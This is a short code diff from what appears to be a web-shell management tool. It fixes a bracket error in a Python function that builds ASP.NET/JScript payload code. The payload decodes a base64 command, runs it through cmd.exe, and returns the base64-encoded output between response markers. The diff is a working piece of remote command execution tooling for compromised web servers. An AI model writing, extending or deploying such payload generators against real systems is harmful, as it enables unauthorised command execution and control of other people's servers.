@@ -153,7 +153,7 @@ def remote_command(language, cmd_type, mode, rsp_header, rsp_footer, command):
                 f'Response.Write("{rsp_header}"+Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(out.ReadToEnd()+EI.ReadToEnd()))+"{rsp_footer}");'
 
             if mode == "base64_header":
-                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{base64.b64encode(command)).decode()}"));'\
+                code = f'var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{(base64.b64encode(command)).decode()}"));'\
                 'var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();'\
                 'var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;'\
                 'c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;'\
